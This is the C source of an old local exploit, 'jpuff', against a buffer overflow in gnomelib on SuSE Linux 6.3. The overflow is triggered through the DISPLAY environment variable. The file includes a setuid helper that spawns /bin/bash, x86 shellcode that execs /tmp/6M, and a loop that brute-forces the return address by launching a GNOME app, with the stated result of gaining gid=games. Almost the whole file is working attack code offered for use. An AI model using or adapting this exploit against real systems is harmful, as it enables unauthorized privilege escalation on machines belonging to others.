/*
Gnomelib exploit by bladi & aLmUDeNa

All gnome apps have an exploitable buffer overflow
(gnomelib) when get DISPLAY environment variable.

Affected: S.u.S.E Linux: 6.3

Not vulnerable: RedHat 6.x
                Linpus Linux release 6.3
                Debian 
                  NoTe:
don't forget to put 6M in /tmp
---------(6M.c)---------
void main() {
    setuid(geteuid());
    setregid(getegid(), getegid());
    system("/bin/bash");
            }
---------(6M.c)---------

Bueno un saludo a todos los que nos conocen/quieren/odian,
bueno ya llevamos 6 meses y esperamos que dure mucho mas ;*


                                bladi@euskalnet.net
                                almudena@hempcultivation.com
*/
  #include <stdio.h>
#include <stdlib.h>
#define NOP                              0x90
#define RANFROM                         -1400
#define RANTO                            -300

int i,x;
char *ptr;
unsigned long *ptr2;  
char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/6M";
char buffer[164];

main(int argc, char *argv[])
{                          long get_sp(void)
{
__asm__("movl %esp,%eax\n");    
}                               
printf (" jpuff    ver: 1.0  \n");
printf ("         by         \n");
printf (" bladi & aLmUDeNa\n\n");
if (argc < 2 )                           
    {
    printf(" Usage ./jpuff <gnome app>\n");  
    printf("    Try: ./jpuff /opt/gnome/bin/sol => you gain
gid=40(game)\n");
    exit(1);
    }
for (x=RANFROM;x<RANTO;x=13+x)
    {
    for(i=0;i<164;i++)
        buffer[i]=0x00;
    ptr=buffer;  
      for(i=0;i<22;i++)
          *(ptr++)=NOP;
    for(i=0;i<strlen(execshell);i++)
          *(ptr++)=execshell[i];
    ptr2=(long *)ptr;
    for(i=0;i<20;i++)           
          *(ptr2++)=get_sp()+x;
     setenv("DISPLAY",buffer,1);  
    system(argv[1]);
    }
printf("\n- --( ExPLoIT DoNE )-- -\n");
printf("Have a lot of fun... ;*\n\n");  
return 0;
}
